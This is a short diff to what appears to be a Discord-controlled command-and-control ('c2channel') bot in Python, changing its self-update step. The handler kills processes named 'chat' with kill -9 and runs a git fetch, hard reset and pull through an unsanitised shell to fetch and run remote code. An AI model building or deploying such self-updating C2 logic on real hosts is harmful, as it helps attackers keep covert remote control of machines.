@@ -108,7 +108,7 @@ async def on_message(message):
         # Kill existing c2 channels
         chat_pid = Popen("ps aux | grep 'chat' | grep -v grep | awk -F '  ' '{print $2}'", shell=True)
         kill_chat = 'kill -9 ' + str(chat_pid)
-        git_update = 'git pull https://github.com/andreweng/c2channel.git'
+        git_update = 'git fetch && git reset --hard HEAD && git pull'
 
         await message.channel.send(f'--- Hey, I will be right back, I am going to do some updates...')
         stdout = Popen(git_update, shell=True, stdout=PIPE).stdout
